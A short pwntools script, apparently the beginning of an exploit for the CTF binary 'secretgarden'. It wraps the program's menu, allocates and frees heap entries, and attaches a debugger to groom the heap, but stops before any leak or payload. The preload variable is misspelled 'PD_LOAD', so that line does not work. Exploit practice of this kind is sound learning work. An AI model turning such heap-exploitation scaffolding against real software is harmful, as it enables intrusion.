from pwn import *

context.log_level = 'debug'

p = process("./secretgarden", {"PD_LOAD":"./secretgardenlibc_64.so.6"})

def menu(opt):
    p.sendlineafter("Your choice : ", str(opt))


def add(length, name):
    menu(1)
    p.sendlineafter("Length of the name :" , str(length))
    p.sendlineafter("The name of flower :", name)
    p.sendlineafter("The color of the flower :", "1")
    p.recvuntil("Successful !")
    

def delete(idx):
    menu(3)
    p.sendlineafter("Which flower do you want to remove from the garden:", str(idx))
    p.recvuntil("Successful !")



def clean():
    menu(4)
    p.recvuntil("Successful !")

def show():
    menu(2)
    p.recvuntil("Your Choice : ")


add(5, "AAAAA")     #0
add(5, "BBBBB")     #1
add(5, "CCCCC")     #2
gdb.attach(p)
delete(0)           
delete(1)
delete(2)
add(1, "D")

